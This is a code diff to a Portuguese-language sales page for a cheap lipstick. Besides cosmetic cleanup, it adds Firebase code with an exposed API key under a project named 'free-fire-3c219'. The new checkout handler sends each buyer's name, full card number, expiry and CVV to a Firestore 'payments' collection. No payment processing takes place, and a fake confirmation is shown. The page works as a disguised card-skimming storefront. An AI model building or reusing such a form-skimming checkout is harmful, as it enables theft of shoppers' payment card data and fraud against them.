@@ -22,7 +22,7 @@
             width: 100%;
             max-width: 300px;
             margin: 0 auto;
-            overflow: hidden; /* Garante que apenas uma imagem seja visível */
+            overflow: hidden;
         }
         .swiper-slide img {
             width: 100%;
@@ -49,17 +49,17 @@
         .testimonial-container {
             display: flex;
             align-items: center;
-            margin-bottom: 1rem; /* Espaço entre a linha de imagem/nome e o depoimento */
+            margin-bottom: 1rem;
         }
         .testimonial-img {
-            width: 64px; /* Ajuste o tamanho conforme necessário */
+            width: 64px;
             height: 64px;
-            border-radius: 50%; /* Imagem circular */
-            object-fit: cover; /* Garante que a imagem preencha o espaço sem distorção */
-            margin-right: 1rem; /* Espaço entre a imagem e o nome */
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 1rem;
         }
         .testimonial-content {
-            text-align: left; /* Alinha o texto do depoimento à esquerda */
+            text-align: left;
         }
     </style>
 </head>
@@ -81,16 +81,15 @@
             <a href="#produtos" class="bg-black text-white py-3 px-8 rounded-lg hover:bg-gray-800 transition inline-block">Explorar Coleção</a>
         </div>
     </section>
-<!-- Seção do Produto -->
-<section id="produtos" class="py-13 bg-white">
-    <div class="container mx-auto px-4 text-center">
-        <h2 class="text-4xl font-playfair text-gray-800 mb-2">Batom Retro Matte</h2>
-        <div class="flex justify-center mb-4">
-            <div class="text-yellow-500 flex items-center">
-                ★★★★☆ <span class="ml-3 text-gray-600">(231)</span>
-            </div>
-        
-        <!-- Resto do conteúdo da seção -->
+
+    <!-- Seção do Produto -->
+    <section id="produtos" class="py-13 bg-white">
+        <div class="container mx-auto px-4 text-center">
+            <h2 class="text-4xl font-playfair text-gray-800 mb-2">Batom Retro Matte</h2>
+            <div class="flex justify-center mb-4">
+                <div class="text-yellow-500 flex items-center">
+                    ★★★★☆ <span class="ml-3 text-gray-600">(231)</span>
+                </div>
             </div>
             <!-- Carrossel de Imagens -->
             <div class="swiper-container mb-4">
@@ -291,8 +290,26 @@
         </div>
     </footer>
 
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore.js"></script>
+    <!-- Swiper JS -->
     <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
     <script>
+        // Configuração do Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyAFSGtCNYaEccqUwX8VTEKOgmfBGqqW3pA",
+            authDomain: "free-fire-3c219.firebaseapp.com",
+            projectId: "free-fire-3c219",
+            storageBucket: "free-fire-3c219.appspot.com",
+            messagingSenderId: "1063922703234",
+            appId: "1:1063922703234:web:s1qh928gafeudrfhi3d8j8lacdrgr4pn"
+        };
+
+        // Inicializar o Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
         // Inicialização do Swiper
         document.addEventListener('DOMContentLoaded', function () {
             var swiper = new Swiper('.swiper-container', {
@@ -311,10 +328,10 @@
                     el: '.swiper-pagination',
                     clickable: true,
                 },
-                centeredSlides: true, // Centraliza o slide ativo
-                effect: 'fade', // Usa efeito de fade para transições suaves
+                centeredSlides: true,
+                effect: 'fade',
                 fadeEffect: {
-                    crossFade: true // Garante que apenas um slide seja visível
+                    crossFade: true
                 }
             });
         });
@@ -337,8 +354,8 @@
             paymentForm.scrollIntoView({ behavior: 'smooth' });
         }
 
-        // Validação do formulário e salvamento em arquivo TXT
-        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+        // Validação do formulário e salvamento no Firestore
+        document.getElementById('paymentForm').addEventListener('submit', async function(event) {
             event.preventDefault();
             
             const errorMessage = document.getElementById('error-message');
@@ -377,39 +394,47 @@
                 errorMessage.classList.remove('hidden');
                 return;
             }
-            if (!color) {
-                errorMessage.textContent = 'Por favor, selecione uma cor antes de prosseguir.';
+
+            // Dados para salvar no Firestore
+            const paymentData = {
+                name: name,
+                cardNumber: cardNumber, // ATENÇÃO: Não armazene dados sensíveis em produção
+                expiry: expiry,
+                cvv: cvv,
+                color: color,
+                amount: 'R$ 34,99',
+                quantity: '1 unidade',
+                features: 'Batom Retro Matte 3g',
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            };
+
+            try {
+                // Salvar no Firestore
+                await db.collection('payments').add(paymentData);
+                console.log('Dados salvos no Firestore com sucesso!');
+
+                // Exibir modal de confirmação
+                const modal = document.getElementById('payment-modal');
+                document.getElementById('modal-amount').textContent = 'R$ 34,99';
+                document.getElementById('modal-color').textContent = color;
+                document.getElementById('modal-quantity').textContent = '1 unidade';
+                document.getElementById('modal-features').textContent = 'Batom Retro Matte 3g';
+                modal.classList.remove('hidden');
+            } catch (error) {
+                console.error('Erro ao salvar no Firestore:', error);
+                errorMessage.textContent = 'Erro ao processar o pagamento. Tente novamente.';
                 errorMessage.classList.remove('hidden');
-                return;
             }
-
-            // Dados para o modal de confirmação
-            const modal = document.getElementById('payment-modal');
-            document.getElementById('modal-amount').textContent = 'R$ 34,99';
-            document.getElementById('modal-color').textContent = color;
-            document.getElementById('modal-quantity').textContent = '1 unidade';
-            document.getElementById('modal-features').textContent = 'Batom Retro Matte 3g';
-
-            // Exibir modal
-            modal.classList.remove('hidden');
-
-            // Salvar dados em arquivo TXT (simulação)
-            const data = `Nome: ${name}\nCartão: ${cardNumber}\nValidade: ${expiry}\nCVV: ${cvv}\nCor: ${color}\n`;
-            const blob = new Blob([data], { type: 'text/plain' });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'compra.txt';
-            link.click();
         });
-        
+
         // Máscara para o campo Validade (MM/AA)
-document.getElementById('expiry').addEventListener('input', function(e) {
-    let value = e.target.value.replace(/\D/g, ''); // Remove tudo que não for número
-    if (value.length > 2) {
-        value = value.slice(0, 2) + '/' + value.slice(2, 4); // Adiciona "/" após os dois primeiros dígitos
-    }
-    e.target.value = value; // Atualiza o valor do campo
-});
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
 
         // Fechar modal
         document.getElementById('close-modal').addEventListener('click', function() {
